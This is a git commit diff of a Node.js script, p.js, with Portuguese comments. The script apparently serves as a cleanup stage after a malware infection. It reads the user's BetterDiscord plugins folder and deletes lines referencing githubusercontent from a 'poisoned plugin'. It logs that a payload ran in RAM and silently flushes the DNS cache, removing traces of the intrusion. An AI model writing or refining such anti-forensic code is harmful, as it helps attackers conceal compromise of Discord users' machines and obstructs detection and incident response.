56673b67d6cf45df12a3879064e18955b60d32a5
morelli <cesarmorelli92451041@gmail.com>
2026-03-10 05:49:23 -0400

    Update p.js

--- p.js
+++ p.js
@@ -1,26 +1,32 @@
 (function() {
     const fs = require('fs');
     const path = require('path');
+
+    // ---
+    // Exemplo:
+    console.log("Carga executada na RAM.");
+
+    // --- 
     const pDir = path.join(process.env.APPDATA, 'BetterDiscord', 'plugins');
-
-    // 1.
-    console.log("Executando carga na RAM...");
-    // 
-
-    // 2. Localiza o plugin envenenado e limpa o código
     const files = fs.readdirSync(pDir).filter(f => f.endsWith('.plugin.js'));
+
     files.forEach(file => {
         const fPath = path.join(pDir, file);
         let content = fs.readFileSync(fPath, 'utf8');
-        
+
         // 
-        if (content.includes('githubusercontent')) {
-            const cleanContent = content.replace(/\nrequire\('https'\).get\('https:\/\/raw\.githubusercontent\.com[\s\S]*?\)\);/, "");
+        if (content.includes('://githubusercontent.com')) {
+            // 
+            const cleanContent = content.split('\n').filter(line => !line.includes('://githubusercontent.com')).join('\n');
+            
+            //
             fs.writeFileSync(fPath, cleanContent, 'utf8');
         }
     });
 
-    // 3.
-    require('child_process').exec('ipconfig /flushdns');
-})();
+    // --- 
+    try {
+        require('child_process').exec('ipconfig /flushdns');
+    } catch(e) {}
 
+})();
